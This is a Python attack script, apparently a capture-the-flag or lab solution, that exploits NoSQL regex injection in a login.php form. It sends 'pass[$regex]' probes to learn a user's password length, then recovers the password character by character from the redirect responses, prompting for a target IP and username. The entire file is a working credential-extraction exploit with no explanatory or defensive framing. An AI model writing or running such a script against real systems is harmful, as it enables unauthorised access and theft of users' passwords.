import requests
from termcolor import colored

def get_length(user, url2):

    for i in range(1, 64):

        data="user=%s&pass[$regex]=^.{%s}$&remember=on" % (user, i)
        headers={"Content-Type": "application/x-www-form-urlencoded"}

        r = requests.post(url2, data=data, headers=headers, allow_redirects=False)

        if "err=1" not in r.headers["Location"]:
            print(colored("[+]", "blue") + " Password length: %s" % i)
            return i

def bruteforce(user, passwdLen, url2):

    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    # Setup password regex
    passreg = "^"
    for i in range(passwdLen):
        passreg += "."
    passreg += "$"

    # Bruteforce password
    for i in range(1, passwdLen + 1):
        for char in charset:

            # Setup regex
            passreg = list(passreg)
            passreg[i] = char
            passreg = "".join(passreg)

            # Send request
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = "user=%s&pass[$regex]=%s&remember=on" % (user, passreg)

            r = requests.post(url2, data=data, headers=headers, allow_redirects=False)

            # Check if current password is correct
            if "err=1" not in r.headers["Location"]:

                currentpass = passreg.replace("^", "").replace("$", "").replace(".", "")
                asterisk = "*" * (passreg.count("."))
                print(colored("[+]", "green") + " Password: %s%s" % (currentpass, asterisk), end="\r")
                break

    print(colored("[+]", "green") +" Password: " + colored(currentpass, "green"))              


url = "http://" + str(input("ip: ")) + "/login.php"
user = str(input("user: "))

print()
print(colored("[i]", "yellow") + " Getting password length for user " + colored(user, "red"))
l = get_length(user, url)

bruteforce(user, l, url)